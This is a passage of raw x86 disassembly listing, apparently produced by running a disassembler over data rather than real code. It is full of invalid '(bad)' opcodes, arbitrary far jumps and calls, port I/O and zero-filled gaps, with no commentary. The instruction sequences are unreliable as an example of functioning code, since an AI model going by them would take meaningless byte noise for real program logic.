  417e45:	add    al,0x1
  417e47:	add    dh,dh
  417e49:	add    BYTE PTR [eax],al
  417e4b:	add    BYTE PTR [ecx+0x8],bl
  417e4e:	(bad)
  417e51:	pop    ds
  417e52:	add    BYTE PTR ds:0xd8c24217,ah
  417e58:	sar    BYTE PTR [edi-0x154348c0],cl
  417e5e:	cmp    DWORD PTR [eax-0x1a],0xffffffec
  417e62:	mov    dh,BYTE PTR [esi-0x1a27796e]
  417e68:	dec    esp
  417e69:	cmp    BYTE PTR [ecx-0x6b],ch
  417e6c:	ror    DWORD PTR [esi],0xe
  417e6f:	popf   
  417e70:	mov    WORD PTR [ecx+0x37dea4af],fs
  417e76:	jmp    0x417e8b
  417e78:	xchg   edx,eax
  417e79:	iret   
  417e7a:	sbb    esp,0xef9327b3
  417e80:	sbb    eax,0xd82de640
  417e85:	mov    ebx,0x8cd6e03e
  417e8a:	bound  edi,QWORD PTR ds:0x55117d05
  417e90:	xor    cl,BYTE PTR [esi+0xdf1b91]
  417e96:	cld    
  417e97:	or     BYTE PTR [edi-0x37],dh
  417e9a:	bound  ebx,QWORD PTR [ebp+0x6dc147b3]
  417ea0:	dec    eax
  417ea1:	push   ebx
  417ea2:	shl    ebp,cl
  417ea4:	push   ebx
  417ea5:	sub    bh,BYTE PTR [ecx+0x6f]
  417ea8:	fild   WORD PTR [eax]
  417eaa:	mov    cl,0x25
  417eac:	adc    al,0x4c
  417eae:	rcr    BYTE PTR [edx+esi*2-0x42],1
  417eb2:	mov    dh,0xbb
  417eb4:	sub    eax,0x371009f5
  417eb9:	std    
  417eba:	push   ecx
  417ebb:	lds    ecx,FWORD PTR [ebp-0x4c24bdd5]
  417ec1:	cmp    DWORD PTR [eax],0xef5c30ad
  417ec7:	cwde   
  417ec8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  417ec9:	dec    ebx
  417eca:	or     al,0xbd
  417ecc:	add    DWORD PTR ds:0x5f793fe3,0xffffffba
  417ed3:	jmp    0x2e50:0x89b04607
  417eda:	jno    0x417f24
  417edc:	add    ecx,0x43086264
  417ee2:	sbb    ecx,ebx
  417ee4:	sub    eax,eax
  417ee6:	outs   dx,DWORD PTR ds:[esi]
  417ee7:	std    
  417ee8:	sbb    dh,dh
  417eea:	ds aaa 
  417eec:	shld   DWORD PTR [ebp+0x7f579bf7],eax,0xa9
  417ef4:	sbb    eax,0x469a785c
  417ef9:	xchg   ebp,eax
  417efa:	test   al,0xb6
  417efc:	jp     0x417f31
  417efe:	ret    
  417eff:	into   
  417f00:	call   0x7e5c15f7
  417f05:	jge    0x417f12
  417f07:	push   ebx
  417f08:	imul   eax,DWORD PTR [ecx-0x7e],0xffffff95
  417f0c:	push   ds
  417f0d:	mov    ah,0xcf
  417f0f:	cmp    ebp,ebx
  417f11:	mov    dl,0x5b
  417f13:	jno    0x417efb
  417f15:	or     ah,BYTE PTR [edi]
  417f17:	mov    ecx,0xee079aaa
  417f1c:	or     esp,DWORD PTR [esp+ebx*4-0x4fb0db4e]
  417f23:	sub    DWORD PTR [ebp+0x26f35ae7],edi
  417f29:	dec    ecx
  417f2a:	push   ebx
  417f2b:	stos   BYTE PTR es:[edi],al
  417f2c:	mov    al,0x72
  417f2e:	mov    ebx,DWORD PTR [edi]
  417f30:	pop    esp
  417f31:	jecxz  0x417f51
  417f33:	xor    al,0xbd
  417f35:	sbb    BYTE PTR [ecx+0x40536622],cl
  417f3b:	mov    ds,WORD PTR [edx+0x45]
  417f3e:	cld    
  417f3f:	dec    esi
  417f40:	sub    BYTE PTR [eax+eax*1+0x0],ch
	...
  417fb3:	add    BYTE PTR [esi+0x2d],dh
  417fb6:	push   ebp
  417fb7:	inc    ecx
  417fb8:	pop    edi
  417fb9:	jns    0x418031
  417fbb:	aas    
  417fbc:	fisttp DWORD PTR [esi-0x68]
  417fbf:	inc    edx
  417fc0:	ret    0x78d5
  417fc3:	jge    0x418007
  417fc5:	add    eax,0xf60001
  417fca:	add    BYTE PTR [eax],al
  417fcc:	cmc    
  417fcd:	and    eax,0xedeacf65
  417fd2:	inc    ecx
  417fd3:	push   esp
  417fd4:	dec    eax
  417fd5:	mov    esi,edx
  417fd7:	add    ebp,DWORD PTR [edi]
  417fd9:	adc    bl,ch
  417fdb:	jp     0x417ffa
  417fdd:	xchg   ecx,eax
  417fde:	xchg   ebx,edi
  417fe0:	fcom   QWORD PTR [esi+0x30a1cd2b]
  417fe6:	jb     0x418010
  417fe8:	stos   BYTE PTR es:[edi],al
  417fe9:	loope  0x41805a
  417feb:	mov    edx,0x504857f2
  417ff0:	jns    0x41806c
  417ff2:	stos   DWORD PTR es:[edi],eax
  417ff3:	out    0x20,al
  417ff5:	mov    bl,BYTE PTR [ebp+ecx*4-0x6a]
  417ff9:	xchg   esp,eax
  417ffa:	mov    BYTE PTR [ebx],bh
  417ffc:	and    al,0xf8
  417ffe:	mov    ecx,0xb5bf58a
  418003:	setle  BYTE PTR [eax-0x6201a7e8]
  41800a:	xchg   ebp,eax
  41800b:	sahf   
  41800c:	call   0xe58c5b9f
  418011:	xchg   edi,eax
  418012:	mov    bh,0xd7
  418014:	and    DWORD PTR [edx+0x7a],edi
  418017:	mov    al,ds:0x57fcdc3a
  41801c:	push   ecx
  41801d:	addr16 push ss
  41801f:	iret   
  418020:	sub    eax,0x8299fbe8
  418025:	iret   
  418026:	std    
  418027:	xchg   ebx,eax
  418028:	stos   DWORD PTR es:[edi],eax
  418029:	xor    dl,dl
  41802b:	adc    ebp,ebp
  41802d:	(bad)  
  41802e:	and    esi,DWORD PTR [ebx+0x1adaa1df]
  418034:	jae    0x418003
  418036:	dec    esi
  418037:	xchg   edx,eax
  418038:	jg     0x418074
  41803a:	ds retf 
  41803c:	and    BYTE PTR [esi+esi*8-0x3b],bl
  418040:	sbb    al,0xec
  418042:	cmp    BYTE PTR [esi+0x103f740d],0xa8
  418049:	fs jo  0x4180c3
  41804c:	adc    al,0xc6
  41804e:	mov    ?,WORD PTR [ebp+0x358c5069]
  418054:	cmp    ah,dh
  418056:	out    0x9c,al
  418058:	dec    ebx
  418059:	push   edi
  41805a:	ret    0x67e2
  41805d:	mov    cl,0xe4
  41805f:	rcl    ah,0xa9
  418062:	push   edx
  418063:	jbe    0x41807e
  418065:	cmp    DWORD PTR [ebx+0x4c],eax
  418068:	push   edx
  418069:	icebp  
  41806a:	out    dx,al
  41806b:	fs nop
  41806d:	pop    esp
  41806e:	in     al,dx
  41806f:	xchg   ebp,eax
  418070:	push   0xffffff86
  418072:	sbb    eax,0x17981758
  418077:	add    DWORD PTR [esi],esi
  418079:	add    edi,edx
  41807b:	jnp    0x41805c
  41807d:	xor    DWORD PTR [ebp-0x29],0xffffff96
  418081:	dec    ebx
  418082:	pop    es
  418083:	ror    DWORD PTR [esi],cl
  418085:	sbb    BYTE PTR [eax],0x4c
  418088:	jle    0x41804a
  41808a:	(bad)  
  41808b:	popa   
  41808c:	xor    eax,0x18e93d2b
  418091:	jp     0x4180ad
  418093:	dec    edx
  418094:	xchg   edx,eax
  418095:	cli    
  418096:	not    DWORD PTR [ebx-0x1]
  418099:	adc    DWORD PTR [esi+edx*8+0x722bcf87],0xff92aa5b
  4180a4:	je     0x41807c
  4180a6:	xor    BYTE PTR [ecx-0x71146de9],bh
  4180ac:	mov    DWORD PTR [edi],ebx
  4180ae:	in     eax,0x20
  4180b0:	mov    esi,0xd1a8b853
  4180b5:	push   es
  4180b6:	inc    esp
  4180b7:	retf   0x8b2b
  4180ba:	sub    BYTE PTR [eax+0x70],ah
  4180bd:	pop    ecx
  4180be:	or     bl,ah
  4180c0:	add    DWORD PTR ds:0x0,edx
	...
  418132:	add    BYTE PTR [eax],al
  418134:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  418135:	sbb    DWORD PTR [eax+0x1a],esi
  418138:	(bad)  
  418139:	jnp    0x418129
  41813b:	mov    ebp,0xe8ea9e45
  418140:	jg     0x4180c4
  418142:	shl    edx,1
  418144:	cmp    BYTE PTR [esi],al
  418146:	add    DWORD PTR [eax],eax
  418148:	test   BYTE PTR [eax],0x0
  41814b:	add    BYTE PTR [edi],bh
  41814d:	cmp    al,0xcc
  41814f:	loopne 0x4180d6
  418151:	pop    eax
  418152:	dec    esi
  418153:	mov    ebx,0x2ba7afd2
  418158:	mov    ds:0xfc1a9d91,al
  41815d:	fwait
  41815e:	test   al,0xc6
  418160:	sub    al,0xd1
  418162:	push   ss
  418163:	dec    edx
  418164:	into   
  418165:	xor    ebp,DWORD PTR [edi+0x69]
  418168:	adc    BYTE PTR [edi-0x671dc907],al
  41816e:	fadd   st(0),st
  418170:	ffreep st(4)
  418172:	pop    ss
  418173:	mov    eax,ds:0xa7d4c034
  418178:	fadd   QWORD PTR [eax]
  41817a:	jo     0x4181e2
  41817c:	out    0x30,eax
  41817e:	cli    
  41817f:	ss loopne 0x418185
  418182:	cdq    
  418183:	stos   DWORD PTR es:[edi],eax
  418184:	xchg   ecx,eax
  418185:	jmp    0x4181e1
  418187:	inc    esi
  418188:	dec    esi
  418189:	out    dx,al
  41818a:	sbb    edi,DWORD PTR [ebx]
  41818c:	cmp    al,0xa6
  41818e:	pusha  
  41818f:	jecxz  0x418171
  418191:	and    eax,0x8147115
  418196:	pop    ebx
  418197:	jmp    0xd4c19392
  41819c:	or     al,0x4e
  41819e:	pop    eax
  41819f:	and    ebx,esp
  4181a1:	(bad)  
  4181a2:	adc    ah,BYTE PTR [edx-0x52053d5b]
  4181a8:	retf   0x9441
  4181ab:	hlt    
  4181ac:	es aaa 
  4181ae:	cmp    BYTE PTR [esi+0x3c],bl
  4181b1:	jp     0x418156
  4181b3:	ins    DWORD PTR es:[edi],dx
  4181b4:	push   0x65
  4181b6:	outs   dx,DWORD PTR ds:[esi]
  4181b8:	(bad)  
  4181b9:	(bad)  
  4181ba:	sub    al,0xe7
  4181bc:	mov    ah,0x61
  4181be:	pop    ss
  4181bf:	jns    0x41816c
  4181c1:	mov    ch,0x3e
  4181c3:	aaa    
  4181c4:	inc    ecx
  4181c5:	jb     0x418223
  4181c7:	(bad)  
  4181c8:	mov    bl,0x9e
  4181ca:	cld    
  4181cb:	and    dh,BYTE PTR ds:0xaf3628f6
  4181d1:	inc    esp
  4181d2:	in     eax,dx
  4181d3:	push   0xa7aa7ae7
  4181d8:	test   DWORD PTR [ebx+0x58],ebp
  4181db:	fbld   TBYTE PTR [esi-0x2782c9ea]
  4181e1:	mov    edi,edx
  4181e3:	js     0x418195
  4181e5:	cmp    eax,0x94260056
  4181ea:	xchg   esp,eax
  4181eb:	dec    edi
  4181ec:	add    al,0x67
  4181ee:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4181ef:	mov    dh,dh
  4181f1:	popa   
  4181f2:	jecxz  0x418267
  4181f4:	mov    ecx,0x178aa2e0
  4181f9:	push   ebx
  4181fa:	test   eax,0xbde98cd2
  4181ff:	mov    esp,0x97987953
  418204:	inc    esp
  418205:	out    dx,al
  418206:	dec    DWORD PTR [ecx+ecx*8+0x1e]
  41820a:	mov    DWORD PTR [edi-0x703e192],edi
  418210:	rcr    BYTE PTR [esi-0x40],cl
  418213:	push   eax
  418214:	xchg   ebx,eax
  418215:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  418216:	fld    QWORD PTR [ebx-0x3c]
  418219:	or     dl,BYTE PTR [edi+0x40053c28]
  41821f:	pop    ss
  418220:	out    dx,eax
  418221:	mov    bh,dh
  418223:	xor    eax,0x329647e6
  418228:	fwait
  418229:	dec    ebp
  41822a:	mov    edx,DWORD PTR [ebx]
  41822c:	inc    ecx
  41822d:	inc    ecx
  41822e:	cdq    
  41822f:	pop    ss
  418230:	fcomp  QWORD PTR [edx-0x4b]
  418233:	in     eax,0xfb
  418235:	fdivr  DWORD PTR [ecx-0x66605404]
  41823b:	scas   al,BYTE PTR es:[edi]
  41823c:	fild   DWORD PTR ss:[ecx+0x26]
  418240:	ins    DWORD PTR es:[edi],dx
  418241:	rol    BYTE PTR [eax],cl
	...
  4182b3:	add    BYTE PTR [ecx-0x44],ch
  4182b6:	xlat   BYTE PTR ds:[ebx]
  4182b7:	pop    esi
  4182b8:	xlat   BYTE PTR ds:[ebx]
  4182b9:	jg     0x4182a4
  4182bb:	mov    edi,0x113ef3ec
  4182c0:	xchg   ebx,eax
  4182c1:	adc    eax,ecx
  4182c3:	push   ss
  4182c4:	cs pop es
  4182c6:	add    DWORD PTR [eax],eax
  4182c8:	test   BYTE PTR [eax],0x0
  4182cb:	add    bh,al
  4182cd:	sub    edi,DWORD PTR [ecx]
  4182cf:	mov    dh,0xd2
  4182d1:	lea    esp,[edx]
  4182d3:	sub    ebp,DWORD PTR [ebp-0x14ce129a]
  4182d9:	fwait
  4182da:	outs   dx,BYTE PTR ss:[esi]
  4182dc:	jge    0x41827e
  4182de:	and    eax,0xa381322c
  4182e3:	pop    edx
  4182e4:	mov    ds:0x82f6a645,eax
  4182e9:	sub    al,0x26
  4182eb:	push   cs
  4182ec:	add    eax,DWORD PTR [ebp-0x69]
  4182ef:	jb     0x418322
  4182f1:	sbb    BYTE PTR [ebx+0x37],al
  4182f4:	stos   DWORD PTR es:[edi],eax
  4182f5:	popf   
  4182f6:	ins    BYTE PTR es:[edi],dx
  4182f7:	or     al,0x23
  4182f9:	fdiv   DWORD PTR [ecx+eiz*8]
  4182fc:	mov    bl,ch
  4182fe:	xchg   edx,eax
  4182ff:	xchg   ebx,eax
  418300:	das    
  418301:	or     DWORD PTR [ecx+esi*4],esi
  418304:	jge    0x4182b8
  418306:	ds sbb eax,0x4ea858f7
  41830c:	mov    ebx,0xfae394de
  418311:	jg     0x41836d
  418313:	pop    esi
  418314:	push   ebx
  418315:	loop   0x41836f
  418317:	jecxz  0x418392
  418319:	cmovp  ebx,DWORD PTR [edi-0x3de315f4]
  418320:	add    al,0xc6
  418322:	pop    ds
  418323:	dec    ebx
  418324:	or     al,0x65
  418326:	jmp    0x4182d0
  418328:	clc    
  418329:	mov    cl,0xa3
  41832b:	dec    edi
  41832c:	xor    al,BYTE PTR [edx+0x61dbc1a3]
  418332:	jge    0x41835b
  418334:	outs   dx,DWORD PTR ds:[esi]
  418335:	gs (bad) 
  418337:	mov    ah,BYTE PTR [ebp+0x11]
  41833a:	rcr    BYTE PTR [ecx],0xf6
  41833d:	fistp  DWORD PTR [edi]
  41833f:	jnp    0x418396
  418341:	pop    esp
  418342:	mov    dh,0x4c
  418344:	imul   ecx,DWORD PTR [edx-0x29799f21],0x59
  41834b:	fsub   DWORD PTR [ebx-0x4fa87aec]
  418351:	inc    esp
  418352:	mov    edi,0xfc6703d4
  418357:	sub    dl,cl
  418359:	gs sub eax,0x5df91578
  41835f:	sbb    BYTE PTR [edi-0x20],dl
  418362:	xchg   ebx,eax
  418363:	lods   al,BYTE PTR ds:[esi]
  418364:	out    dx,al
  418365:	fwait
  418366:	push   esi
  418367:	out    dx,al
  418368:	sub    al,0xca
  41836a:	outs   dx,DWORD PTR es:[esi]
  41836c:	(bad)  
  41836e:	adc    BYTE PTR [edx+0x6def4c25],dh
  418374:	in     al,dx
  418375:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  418376:	cld    
  418377:	jb     0x41839b
  418379:	ja     0x418393
  41837b:	fdiv   QWORD PTR [edi-0x8]
  41837e:	cmp    BYTE PTR [ebx+edi*4-0x65bb2f07],cl
  418385:	stos   BYTE PTR es:[edi],al
  418386:	es cwde 
  418388:	add    al,0x7
  41838a:	fstp   DWORD PTR [ecx-0x44]
  41838d:	pop    edi
  41838e:	jns    0x418405
  418390:	mov    bl,0x8c
  418392:	mov    cl,0x6d
  418394:	inc    esp
  418395:	sbb    dh,dh
  418397:	es mov al,ss:0x123b88bf
  41839e:	add    ch,al
  4183a0:	shr    ch,cl
  4183a2:	jge    0x4183a5
  4183a4:	pop    es
  4183a5:	mov    WORD PTR [ebp+0x1221d8df],ss
  4183ab:	ins    BYTE PTR es:[edi],dx
  4183ac:	shr    DWORD PTR es:[esi+0x1c],1
  4183b0:	mov    esp,0xe7f67694
  4183b5:	xchg   esp,eax
  4183b6:	mov    bh,0x4e
  4183b8:	mov    ebx,0xa45634b8
  4183bd:	push   esp
  4183be:	inc    ebx
  4183bf:	std    
  4183c0:	fdiv   DWORD PTR [ebp+0x0]
	...
  418433:	add    BYTE PTR [ecx+0x6b0c6aba],dl
  418439:	fdivr  st(7),st
  41843b:	mov    edi,0xdccd8f2d
  418440:	xchg   esi,eax
  418441:	xor    edi,DWORD PTR [edx+0x10824b8]
  418447:	add    dh,dh
  418449:	add    BYTE PTR [eax],al
  41844b:	add    BYTE PTR [edx+0x4b],ah
  41844e:	sub    eax,0xefc305e1
  418453:	in     eax,0x13
  418455:	call   DWORD PTR [esi]
  418457:	lods   al,BYTE PTR ds:[esi]
  418458:	lea    ebp,[esi-0x89f382d]
  41845e:	mov    ecx,0x5ed6d3cc
  418463:	mov    edi,0x63db492f
  418468:	fstp   QWORD PTR [ebx+edx*4+0x2f]
  41846c:	jno    0x418453
  41846e:	jno    0x418402
  418470:	(bad)  
  418471:	fstp   st(4)
  418473:	xor    dh,BYTE PTR [ebx]
  418475:	push   ecx
  418476:	or     esp,0xbea00052
  41847c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41847d:	leave  
  41847e:	xor    eax,0x837eb3c5
  418483:	sbb    eax,0xcff72cad
  418488:	fstp   TBYTE PTR [eax+0x74]
  41848b:	ret    
  41848c:	bound  eax,QWORD PTR [ecx-0x568beaa6]
  418492:	push   eax
  418493:	and    DWORD PTR [edi+0x74716b6e],edi
  418499:	pop    ds
  41849a:	xchg   ebx,eax
  41849b:	or     eax,0x339586a8
  4184a0:	inc    ecx
  4184a1:	shl    DWORD PTR [ecx],0x75
  4184a4:	int3   
  4184a5:	and    bh,dh
  4184a7:	inc    ebx
  4184a8:	test   BYTE PTR [ecx],ch
  4184aa:	(bad)  
  4184ab:	fs add al,0xd2
  4184ae:	jno    0x4184ea
  4184b0:	fs out dx,eax
  4184b2:	xchg   DWORD PTR [edi+0x2a782f1a],ebx
  4184b8:	shl    BYTE PTR [ebp-0x6677d1c7],1
  4184be:	or     al,0x47
  4184c0:	and    al,0x45
  4184c2:	popa   
  4184c3:	icebp  
  4184c4:	mov    ecx,ebp
  4184c6:	jne    0x418535
  4184c8:	psubsb mm7,QWORD PTR [ecx-0x6b]
  4184cc:	jae    0x4184d4
  4184ce:	sbb    al,0x9
  4184d0:	jo     0x418499
  4184d2:	lds    eax,FWORD PTR [edi]
  4184d4:	mov    eax,ds:0x30be0a76
  4184d9:	mov    al,ds:0x9c5441a3
  4184de:	sahf   
  4184df:	jmp    FWORD PTR [esi]
  4184e1:	push   eax
  4184e2:	int3   
  4184e3:	in     al,dx
  4184e4:	pusha  
  4184e5:	and    dl,cl
  4184e7:	mov    ds:0x33173a1c,al
  4184ec:	ds retf 0x49e1
  4184f0:	push   esi
  4184f1:	mov    ?,WORD PTR [ebp+0x7]
  4184f4:	gs xchg ebx,eax
  4184f6:	push   0xde7eb2d1
  4184fb:	pushf  
  4184fc:	jbe    0x4184e8
  4184fe:	clc    
  4184ff:	es pop edi
  418501:	(bad)  
  418502:	mov    ah,0x80
  418504:	push   cs
  418505:	pusha  
  418506:	pop    ds
  418507:	out    dx,eax
  418508:	loopne 0x418494
  41850a:	cmp    eax,0x16a0683d
  41850f:	aad    0xaa
  418511:	in     eax,dx
  418512:	gs mov bl,0x77
  418515:	daa    
  418516:	in     al,dx
  418517:	pop    es
  418518:	sahf   
  418519:	sub    eax,0x6201a9e1
  41851e:	jmp    0xdb11:0xd884e83f
  418525:	in     eax,dx
  418526:	dec    bh
  418528:	rcl    eax,0xe9
  41852b:	cli    
  41852c:	shrd   DWORD PTR [esi-0xdff3eb5],esi,0x30
  418534:	daa    
  418535:	fstp   TBYTE PTR [eax]
  418537:	retf   0x7419
  41853a:	(bad)  
  41853b:	icebp  
  41853c:	inc    ecx
  41853d:	xchg   ebp,eax
  41853e:	pusha  
  41853f:	fcomp  DWORD PTR [edx+0xdd]
	...
  4185b1:	add    BYTE PTR [eax],al
  4185b3:	add    BYTE PTR [ecx-0x20b02c99],ch
  4185b9:	(bad)  
  4185ba:	mov    ebp,0x15c03be7
  4185bf:	stc    
  4185c0:	out    dx,eax
  4185c1:	sbb    eax,0x91ac190
  4185c6:	add    DWORD PTR [eax],eax
  4185c8:	test   BYTE PTR [eax],0x0
  4185cb:	add    BYTE PTR [esp+edi*4-0x65],bh
  4185cf:	xchg   ebx,eax
  4185d0:	stos   DWORD PTR es:[edi],eax
  4185d1:	lea    ebx,[edi+0x26692bbf]
  4185d7:	push   ebx
  4185d8:	xlat   BYTE PTR ds:[ebx]
  4185d9:	ffreep st(1)
  4185db:	(bad)  
  4185dd:	in     eax,dx
  4185de:	or     ch,BYTE PTR [eax+eiz*2-0x31cb4921]
  4185e5:	mov    ebp,0xe4b61c97
  4185ea:	retf   0x929a
  4185ed:	dec    ecx
  4185ee:	cwde   
  4185ef:	sub    edi,0xec65342a
  4185f5:	sar    BYTE PTR [edx-0x5505399d],0x14
  4185fc:	xor    ecx,DWORD PTR ds:[edx]
  4185ff:	dec    esp
  418600:	jl     0x4185ca
  418602:	mov    edi,0xca9bc876
  418607:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  418608:	inc    ecx
  418609:	outs   dx,DWORD PTR ds:[esi]
  41860a:	dec    eax
  41860b:	pop    ebp
  41860c:	in     eax,0xe1
  41860e:	mov    dl,0x94
  418610:	dec    ebp
  418611:	jnp    0x4185c7
  418613:	or     DWORD PTR [edx-0x13aef5c9],ebx
  418619:	add    DWORD PTR [ecx],ebx
  41861b:	div    esp
  41861d:	mov    ds:0x34bda511,eax
  418622:	stos   BYTE PTR es:[edi],al
  418623:	add    bh,ch
  418625:	or     al,0x14
  418627:	push   0x79
  418629:	sahf   
  41862a:	mov    ds:0x91d49f6b,eax
  41862f:	dec    edi
  418630:	out    dx,al
  418631:	xchg   esp,eax
  418632:	(bad)
  418636:	inc    ebx
  418637:	pop    esp
  418638:	lock fcomp DWORD PTR [ecx-0xa]
  41863c:	cwde   
  41863d:	or     DWORD PTR ds:[esi-0x28],esp
  418641:	mov    ecx,0xdfff6d64
  418646:	sar    DWORD PTR [esi-0x75],cl
  418649:	mov    cl,0xd0
  41864b:	arpl   WORD PTR [esi],si
  41864d:	iret   
  41864e:	adc    DWORD PTR [ebx-0x68],esp
  418651:	inc    edi
  418652:	add    dh,BYTE PTR [edx]
  418654:	mov    DWORD PTR [edx+0x6d1ee3f9],0xf4509fa
  41865e:	push   ebx
  41865f:	sub    dl,BYTE PTR [esi-0x7a293612]
  418665:	call   0x8ba:0xd9eac242
  41866c:	cmp    ch,BYTE PTR [ebx]
  41866e:	clc    
  41866f:	sbb    BYTE PTR [ecx-0x50],0x36
  418673:	push   ecx
  418674:	add    DWORD PTR [esi],0xb372188f
  41867a:	into   
  41867b:	lods   al,BYTE PTR ds:[esi]
  41867c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41867d:	dec    ebp
  41867e:	fld1   
  418680:	cmp    BYTE PTR [eax+0x5b],dl
  418683:	jns    0x41866d
  418685:	sub    BYTE PTR [edx-0x308d83f7],ah
  41868b:	sbb    ecx,DWORD PTR [edx+0x1]
  41868e:	cmovge eax,DWORD PTR [ecx+edx*8-0x3a]
  418693:	adc    BYTE PTR [eax],cl
  418695:	adc    al,0xb5
  418697:	cs mov dh,0xab
  41869a:	cmp    al,0x15
  41869c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41869d:	adc    DWORD PTR [ecx-0x31],esi
  4186a0:	inc    edx
  4186a1:	inc    ecx
  4186a2:	mov    DWORD PTR [ebx+0x17],edi
  4186a5:	cmp    dh,ch
  4186a7:	inc    ecx
  4186a8:	daa    
  4186a9:	repz (bad) 
  4186ab:	fidivr WORD PTR [edx+0x60]
  4186ae:	aam    0xb0
  4186b0:	add    DWORD PTR [edi],0xffffffb9
  4186b3:	mov    ecx,0x9d86dc05
  4186b8:	mov    al,ds:0xceacf3b
  4186bd:	(bad)  
  4186be:	in     al,0xd6
  4186c0:	aad    0x0
	...
  418732:	add    BYTE PTR [eax],al
  418734:	jmp    0xff598547
  418739:	imul   ecx
  41873b:	(bad)  
  41873c:	pop    ds
  41873d:	sub    ah,0x2b
  418740:	(bad)  
  418741:	mov    bh,0x3
  418743:	cmp    DWORD PTR [eax],edx
  418745:	or     al,BYTE PTR [ecx]
  418747:	add    dh,dh
  418749:	add    BYTE PTR [eax],al
  41874b:	add    ah,ah
  41874d:	scas   eax,DWORD PTR es:[edi]
  41874e:	(bad)  
  41874f:	cmp    DWORD PTR [edi+0x65],esi
  418752:	dec    edx
  418753:	test   edx,esi
  418755:	cmp    esp,esi
  418757:	aaa    
  418758:	jmp    0x4187ba
  41875a:	mov    ds:0x54bea83f,eax
  41875f:	es repnz mov dl,cl
  418763:	fldcw  WORD PTR [edi+ebx*4-0x347ef16f]
  41876a:	pop    ds
  41876b:	cmc    
  41876c:	mov    esi,0xd24d6da7
  418771:	sub    BYTE PTR [eax+0x44],dh
  418774:	sbb    eax,0x41d2fbd2
  418779:	add    eax,0xb4b97df3
  41877e:	out    dx,eax
  41877f:	dec    esi
  418780:	cs in  al,0xc5
  418783:	fild   QWORD PTR [ecx+0x77d45550]
  418789:	jno    0x4187a5
  41878b:	add    edx,DWORD PTR [ebp+0x22d55ba0]
  418791:	cmp    ecx,ebp
  418793:	(bad)  
  418794:	pop    edi
  418795:	data16 outs dx,BYTE PTR ds:[esi]
  418797:	pop    esp
  418798:	mov    dl,0x56
  41879a:	enter  0xf858,0xb9
  41879e:	popf   
  41879f:	fiadd  DWORD PTR [ebp-0x3bb3ed8]
  4187a5:	sub    bh,BYTE PTR [ecx+0x14]
  4187a8:	mov    ebx,0xe03c43f6
  4187ad:	jae    0x418813
  4187af:	fisttp DWORD PTR [ecx-0x9b0808c]
  4187b5:	mov    ebx,0xa62f0e63
  4187ba:	jbe    0x4187ff
  4187bc:	push   edi
  4187bd:	(bad)  [edx-0x75]
  4187c0:	mov    ah,0x72
  4187c2:	in     al,dx
  4187c3:	and    DWORD PTR [edi-0x35],ebx
  4187c6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4187c7:	xchg   BYTE PTR [esi+0x4d],al
  4187ca:	sub    DWORD PTR [ecx-0x33],0xffffffeb
  4187ce:	fisubr WORD PTR [ebp+0x2b]
  4187d1:	in     al,0xec
  4187d3:	aad    0x84
  4187d5:	push   esp
  4187d6:	mov    eax,ds:0x2eaa5cc1
  4187db:	and    BYTE PTR [ebp-0x34],ch
  4187de:	out    dx,al
  4187df:	fbstp  TBYTE PTR [ebp+edi*2-0x80]
  4187e4:	cld    
  4187e5:	adc    esp,ebx
  4187e7:	in     al,dx
  4187e8:	in     eax,dx
  4187e9:	sub    DWORD PTR ds:0x2b1331b7,esi
  4187ef:	out    0x7d,al
  4187f1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4187f2:	adc    al,0x26
  4187f4:	rol    DWORD PTR [edx-0x7e],1
  4187f7:	pop    ebp
  4187f8:	adc    eax,0x14503953
  4187fd:	mov    ah,0xfa
  4187ff:	xor    ah,BYTE PTR [ebx-0x9]
  418802:	dec    esi
  418803:	jg     0x4187bc
  418805:	aad    0xb8
  418807:	jmp    DWORD PTR [eax]
  418809:	sar    dl,0x69
  41880c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41880d:	cmp    eax,0x37c8f464
  418812:	in     al,dx
  418813:	mov    eax,0xdeb44e9d
  418818:	cmp    dh,dh
  41881a:	inc    ebx
  41881b:	ret    0x396d
  41881e:	jbe    0x418868
  418820:	iret   
  418821:	cld    
  418822:	jo     0x4187b6
  418824:	inc    ebp
  418825:	loop   0x4188a3
  418827:	or     esi,DWORD PTR [ecx-0x16d25dcc]
  41882d:	cmp    eax,0xfef9faf1
  418832:	pushf  
  418833:	inc    eax
  418834:	jmp    0xe8e16a1
  418839:	outs   dx,DWORD PTR ds:[esi]
  41883a:	scas   eax,DWORD PTR es:[edi]
  41883b:	jns    0x418882
  41883d:	jecxz  0x418867
  41883f:	mov    dh,0x8e
  418841:	push   ebp
	...
  4188b2:	add    BYTE PTR [eax],al
  4188b4:	pop    eax
  4188b5:	inc    ecx
  4188b6:	pop    ds
  4188b7:	lods   eax,DWORD PTR ds:[esi]
  4188b8:	pop    ds
  4188b9:	(bad)  
  4188ba:	cli    
  4188bb:	cmc    
  4188bc:	inc    ebx
  4188bd:	mov    ss:0xfa7d9632,al
  4188c3:	sub    DWORD PTR [esi],eax
  4188c5:	or     eax,DWORD PTR [ecx]
  4188c7:	add    dh,dh
  4188c9:	add    BYTE PTR [eax],al
  4188cb:	add    BYTE PTR [ebx+0x4867f61e],bh
  4188d1:	popf   
  4188d2:	lods   eax,DWORD PTR ds:[esi]
  4188d3:	lock (bad) 
  4188d5:	dec    ebx
  4188d6:	sti    
  4188d7:	push   esp
  4188d8:	and    edx,esp
  4188da:	retf   
  4188db:	push   ecx
  4188dc:	adc    eax,0xcdc0d9d1
  4188e1:	mov    al,0x5e
  4188e3:	add    esp,DWORD PTR [ebx]
  4188e5:	bswap  edx
  4188e7:	hlt    
  4188e8:	push   edi
  4188e9:	jle    0x418962
  4188eb:	das    
  4188ec:	das    
  4188ed:	adc    eax,esi
  4188ef:	sbb    BYTE PTR [esi+0x50945a6f],0x29
  4188f6:	dec    ebp
  4188f7:	jb     0x4188c7
  4188f9:	mov    DWORD PTR [ebp-0xad7b3fd],ebx
  4188ff:	outs   dx,DWORD PTR ds:[esi]
